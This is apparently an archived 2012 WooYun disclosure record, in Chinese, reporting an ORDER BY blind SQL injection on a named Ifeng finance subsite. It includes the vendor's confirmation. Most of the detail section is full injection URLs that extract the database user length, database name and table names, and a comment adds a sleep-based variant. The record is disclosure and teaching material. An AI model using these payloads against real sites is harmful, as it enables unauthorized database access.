{"id": 18286, "wybug_id": "wooyun-2012-09095", "wybug_title": "凤凰网某分站注入", "wybug_corp": "凤凰网", "wybug_author": "HRay", "wybug_date": "2012-07-01 16:37", "wybug_open_date": "2012-08-15 16:38", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧", "过滤不严", "盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向公众公开  简要描述： 凤凰网某分站注入，可获取数据库内容 详细说明：  前几天在乌云看到一个orderby的盲注 WooYun: 中关村在线order by语句的盲注思路的分享 于是自己也想学习一下，找到一个凤凰网分站的orderby注入点首先\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(length(user())>22)*8000)&ordertype=asc\n返回页面\n\n而后尝试几个值，到\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(length(user())=22)*8000)&ordertype=asc\n返回页面\n\n判定user()长度为22个字符，这里已经可以判断出这是一个注入点，为了让管理认识到危害，我们接着往下暴数据\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(ascii(substring((database()),1,1))=102)*8000)&ordertype=asc\n依次往下，获取库名为finance\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-((select count(*) from information_schema.tables where table_schema=0x66696E616E6365)=136)*8000)&ordertype=asc\n看来有136个表，这里我们只跑出一个表就可以了，毕竟只是提醒厂商修复漏洞，而不是做渗透测试\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs%28jjdm-%28length%28%28select%20distinct%20table_name%20from%20information_schema.tables%20where%20table_schema=0x66696E616E6365%20limit%201,1%29%29=6%29*8000%29&ordertype=asc\n这里我挑一个短的，第二个表长度为6，并且遇到了一个问题，有时不管表达式是真或假，都会返回这样一个页面\n\n没有返回有股票信息的页面，让我无法判断，后来发现有些出现这种错误的页面在表达式后面加上注释符可以解决，不过并不完美，还是有一些时候会出现这种错误，希望各位大牛指点一下，不只是这种，sleep也是，某些页面不管用>100 =100或者<100都不会延迟最后\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(ascii(substring((select distinct table_name from information_schema.tables where table_schema=0x66696E616E6365 limit 1,1),1,1))=97)*8000)#&ordertype=asc\n这种形式爆出该表名称为all_hq至此检测结束，希望厂家尽快修复   漏洞证明：  \nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(length(user())=22)*8000)&ordertype=asc\n\nhttp://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(ascii(substring((database()),7,1))=101)*8000)&ordertype=asc\n   修复方案：  严格过滤   版权声明：转载请注明来源 HRay@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-01 20:07 厂商回复： 非常感谢您对凤凰网信息安全的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-01 16:45 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  这里说一下，用sleep的话orderby=length(user())=22 and sleep(6000)这样就可以了     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}